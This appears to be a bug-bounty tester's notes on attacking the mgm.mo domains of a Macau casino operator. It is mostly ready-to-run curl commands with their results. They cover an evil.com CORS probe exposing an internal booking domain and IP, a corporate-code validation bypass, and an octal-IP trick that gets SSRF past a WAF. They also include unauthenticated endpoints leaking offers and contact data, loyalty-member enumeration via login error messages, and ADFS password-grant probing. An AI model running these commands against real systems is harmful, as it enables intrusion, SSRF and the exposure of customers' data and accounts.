# MGM SRC (mgm.mo) Complete Testing Notes — 2026-06-08

## Attack Chain Summary

### Step 1: Subdomain Enumeration
62+ subdomains found. Key targets:
- booking.mgm.mo (UmiJS SPA, Tencent WAF, nginx)
- Mlife.mo (Four Winds Interactive CMS, F5 BIG-IP, IIS)
- adfs.mgm.mo (ADFS, exposes full SAML metadata + OAuth config)
- roster.mgm.mo (F5 APM)
- tickets.mgm.mo (Reblaze WAF, status 247)
- merchants.mgm.mo (F5 BigIP)

### Step 2: CORS Leak → Internal Domain
```bash
curl -sk -X OPTIONS 'https://booking.mgm.mo/api' -H 'Origin: https://evil.com' -H 'Access-Control-Request-Method: POST' -D- 2>/dev/null | grep access-control-allow-origin
# Returns: access-control-allow-origin: https://mgm-booking.itedigital.cn
# Internal IP: 106.55.126.156 (Tencent Cloud)
```

### Step 3: Internal Domain API Access
All endpoints accessible on mgm-booking.itedigital.cn:
- /api/dropdown/dropdowns (141KB) — room types, titles, currencies
- /api/locale/get (66KB) — all UI translations
- /api/rateAndRoom/filter/get (889B) — room features
- /api/rateAndRoom/specialRequest/get (375B) — smoking/bed preferences
- /api/calendar/get (142B)
- /api/Mlife/mlifeToken, /api/Mlife/PatronInfos, /api/Mlife/Logout

### Step 4: Corporate Code Validation Bypass
```bash
# Backend accepts ANY code:
curl -sk -X POST 'https://mgm-booking.itedigital.cn/api/rateAndRoom/corporateCode/check' -H 'Content-Type: application/json' -d '{"corporateCode":"FAKECODE","hotelCode":"MGM","template":"001STD"}'
# Returns: {"success":true,"data":true}

# groupCode correctly rejects:
curl -sk -X POST 'https://mgm-booking.itedigital.cn/api/rateAndRoom/groupCode/check' -H 'Content-Type: application/json' -d '{"groupCode":"FAKECODE","hotelCode":"MGM","template":"001STD"}'
# Returns: {"success":false,"data":false}

# Frontend rejects with "Please enter a valid corporate code"
# Exploitation requires intercepting fetch/XHR to modify response
```

### Step 5: WAF Bypass (Alibaba Cloud)
```bash
# Blocked:
curl -sk 'https://Mlife.mo/FourWindsIntegration/OpenIntegration/GetFromUrl.ashx?Connection=DEV&Url=http://127.0.0.1/'
# Returns: Request Rejected

# Bypassed:
curl -sk 'https://Mlife.mo/FourWindsIntegration/OpenIntegration/GetFromUrl.ashx?Connection=DEV&Url=http://0177.0.0.1/'
# Returns: application error (FWI0002) — request reached backend
```

### Step 6: FWI CMS Unauthenticated Access
```bash
# Barcode generation (22KB image):
curl -sk -X POST 'https://Mlife.mo/FourWindsIntegration/eHostWebservice/Barcode.asmx/GenerateCode' -d 'CodeText=TEST&CodeHeight=100&CodeWidth=100&ResponseFormat=image'

# WSDL (8KB):
curl -sk 'https://Mlife.mo/FourWindsIntegration/eHostWebservice/Barcode.asmx?WSDL'

# Data leaks:
curl -sk 'https://Mlife.mo/view/offers'        # 15KB offers
curl -sk 'https://Mlife.mo/view/accommodations' # 2KB with phone/email
curl -sk 'https://Mlife.mo/view/pointRedemptions' # 2KB point data
curl -sk 'https://Mlife.mo/view/freeComps'      # 734B comps

# AES encryption:
curl -sk -X POST 'https://Mlife.mo/encryptAES256' -d 'pin=1234'

# User enumeration:
curl -sk -X POST 'https://Mlife.mo/LoginMlifeESB' -d 'playerId=11111111&pin=1234&dateOfBirthYear=1990&dateOfBirthMonth=01&dateOfBirthDay=01'
# Returns: "The PIN is locked" (real user) vs "Login failed" (non-existent)
```

### Step 7: ADFS Configuration Leak
```bash
curl -sk 'https://adfs.mgm.mo/FederationMetadata/2007-06/FederationMetadata.xml'  # 70KB, X.509 certs
curl -sk 'https://adfs.mgm.mo/adfs/.well-known/openid-configuration'  # 1.8KB, password grant enabled
```
Password grant returns "invalid_client" (not "unsupported_grant_type") — confirms it's enabled.

## Pitfalls
- booking.mgm.mo POST returns 405 (nginx WAF), but OPTIONS returns 204
- Mlife.mo /login returns "登录时效已过" — requires valid session cookie
- SSRF Connection=DEV returns FWI0002 — request reaches backend but Connection config is missing
- Internal domain intermittently returns 000 (timeout) — likely WAF rate limiting
- Frontend corporate code validation cannot be bypassed with simple XHR/fetch intercept (UmiJS internal)
